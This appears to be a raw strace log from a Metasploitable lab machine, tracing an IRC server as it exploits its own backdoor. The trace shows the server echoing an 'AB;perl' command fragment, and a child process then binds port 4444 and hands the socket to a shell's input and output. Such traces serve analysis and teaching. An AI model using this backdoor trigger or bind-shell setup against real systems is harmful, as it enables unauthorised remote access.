[RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
7445  07:18:47.818398 close(6)          = 0
7445  07:18:47.818409 munmap(0xb7dde000, 4096) = 0
7445  07:18:47.818437 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
7445  07:18:47.818458 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d908) = -1 EINVAL (Invalid argument)
7445  07:18:47.818472 _llseek(6, 0, 0xbff5d950, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7445  07:18:47.818483 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d908) = -1 EINVAL (Invalid argument)
7445  07:18:47.818493 _llseek(6, 0, 0xbff5d950, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7445  07:18:47.818503 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
7445  07:18:47.818556 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
7445  07:18:47.818591 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
7445  07:18:47.818616 listen(6, 5)      = 0
7445  07:18:47.818668 accept(6,  <unfinished ...>
7444  07:18:47.818760 exit_group(0)     = ?
7442  07:18:47.818761 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 7444
7442  07:18:47.818761 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7442  07:18:47.818761 --- SIGCHLD (Child exited) @ 0 (0) ---
7442  07:18:47.818761 waitpid(-1, 0xbfd308a8, WNOHANG) = -1 ECHILD (No child processes)
7442  07:18:47.818761 sigreturn()       = ? (mask now [])
7442  07:18:47.818762 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
7442  07:18:47.818776 exit_group(0)     = ?
4519  07:18:47.818811 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 7442
4519  07:18:47.818835 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:18:47.818879 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:18:47.818890 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:18:47.818917 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:18:47.818935 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:18:47.818997 time(NULL)        = 1495624727
4519  07:18:47.819007 time(NULL)        = 1495624727
4519  07:18:47.819039 gettimeofday({1495624727, 819043}, NULL) = 0
4519  07:18:47.819069 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:18:47.819099 clock_gettime(CLOCK_MONOTONIC, {1537, 636112546}) = 0
4519  07:18:47.819112 gettimeofday({1495624727, 819116}, NULL) = 0
4519  07:18:47.819124 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {1, 0})
4519  07:18:47.819164 clock_gettime(CLOCK_MONOTONIC, {1537, 636176515}) = 0
4519  07:18:47.819175 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:18:47.819201 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819218 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819232 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819246 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819259 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819273 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819286 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819300 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819313 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819337 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819378 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819412 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819426 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819439 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819452 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819466 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819479 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819492 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819505 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819520 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819534 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819547 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:47.819565 gettimeofday({1495624727, 819569}, NULL) = 0
4519  07:18:47.819576 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
7445  07:18:48.122420 <... accept resumed> {sa_family=AF_INET, sin_port=htons(41981), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
7445  07:18:48.122480 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5c8f8) = -1 EINVAL (Invalid argument)
7445  07:18:48.122496 _llseek(8, 0, 0xbff5c940, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7445  07:18:48.122522 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5c8f8) = -1 EINVAL (Invalid argument)
7445  07:18:48.122532 _llseek(8, 0, 0xbff5c940, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7445  07:18:48.122542 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
7445  07:18:48.122584 close(6)          = 0
7445  07:18:48.122651 dup(8)            = 6
7445  07:18:48.122664 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d798) = -1 EINVAL (Invalid argument)
7445  07:18:48.122674 _llseek(6, 0, 0xbff5d7e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7445  07:18:48.122684 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
7445  07:18:48.122703 dup2(6, 1)        = 1
7445  07:18:48.122715 close(6)          = 0
7445  07:18:48.122725 fcntl64(1, F_SETFD, 0) = 0
7445  07:18:48.122735 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d768) = -1 EINVAL (Invalid argument)
7445  07:18:48.122745 _llseek(1, 0, 0xbff5d7b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7445  07:18:48.122774 dup(8)            = 6
7445  07:18:48.122785 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d798) = -1 EINVAL (Invalid argument)
7445  07:18:48.122796 _llseek(6, 0, 0xbff5d7e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7445  07:18:48.122805 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
7445  07:18:48.122872 dup2(6, 0)        = 0
7445  07:18:48.122884 close(6)          = 0
7445  07:18:48.122910 fcntl64(0, F_SETFD, 0) = 0
7445  07:18:48.122941 fcntl64(0, F_SETFD, 0) = 0
7445  07:18:48.122957 read(0,  <unfinished ...>
4519  07:18:48.123282 <... select resumed> ) = 1 (in [5], left {0, 700000})
4519  07:18:48.123349 clock_gettime(CLOCK_MONOTONIC, {1537, 940383457}) = 0
4519  07:18:48.123399 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:18:48.123413 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:18:48.123449 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:18:48.123465 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:18:48.123512 close(5)          = 0
4519  07:18:48.123526 time(NULL)        = 1495624728
4519  07:18:48.123538 time(NULL)        = 1495624728
4519  07:18:48.123555 gettimeofday({1495624728, 123559}, NULL) = 0
4519  07:18:48.123567 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:18:48.123595 clock_gettime(CLOCK_MONOTONIC, {1537, 940607964}) = 0
4519  07:18:48.123605 gettimeofday({1495624728, 123609}, NULL) = 0
4519  07:18:48.123615 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 800000})
4519  07:18:48.315025 clock_gettime(CLOCK_MONOTONIC, {1538, 132053997}) = 0
4519  07:18:48.315056 recv(4, "PRIVMSG  #testit Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 54
4519  07:18:48.315082 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315100 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315115 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315129 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315157 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315171 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315184 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315198 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315211 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315224 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315237 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315251 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315264 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315277 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315290 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315303 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315317 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315330 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315343 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315358 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315413 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315428 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:48.315477 gettimeofday({1495624728, 315481}, NULL) = 0
4519  07:18:48.315489 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
7445  07:18:48.645026 <... read resumed> "", 4096) = 0
7445  07:18:48.645156 close(8)          = 0
7445  07:18:48.645432 exit_group(0)     = ?
